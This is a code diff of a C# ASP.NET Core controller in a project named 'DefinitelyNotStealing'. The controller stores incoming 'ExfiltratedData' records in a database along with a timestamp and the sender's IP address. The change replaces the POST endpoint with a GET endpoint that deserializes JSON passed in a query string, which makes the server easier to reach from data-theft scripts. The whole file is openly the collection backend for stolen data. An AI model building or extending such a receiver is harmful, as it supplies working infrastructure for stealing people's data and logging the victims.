@@ -4,6 +4,7 @@ using DefinitelyNotStealing.Data;
 using DefinitelyNotStealing.Models.Entities;
 using Microsoft.AspNetCore.Http;
 using Microsoft.AspNetCore.Mvc;
+using Newtonsoft.Json;
 
 namespace DefinitelyNotStealing.Controllers
 {
@@ -20,14 +21,18 @@ namespace DefinitelyNotStealing.Controllers
             _httpContextAccessor = httpContextAccessor;
         }
 
-        [HttpPost]
-        public async Task Post([FromBody]ExfiltratedData data)
+        [HttpGet]
+        public async Task Get(string stringData)
         {
-            data.ID = 0;
-            data.Timestamp = DateTime.UtcNow;
-            data.ClientIP = _httpContextAccessor.HttpContext.Connection.RemoteIpAddress.ToString();
-            await _ctx.AddAsync(data);
-            await _ctx.SaveChangesAsync();
+            if (!string.IsNullOrEmpty(stringData))
+            {
+                var data = JsonConvert.DeserializeObject<ExfiltratedData>(stringData);
+                data.ID = 0;
+                data.Timestamp = DateTime.UtcNow;
+                data.ClientIP = _httpContextAccessor.HttpContext.Connection.RemoteIpAddress.ToString();
+                await _ctx.AddAsync(data);
+                await _ctx.SaveChangesAsync();
+            }
         }
     }
 }
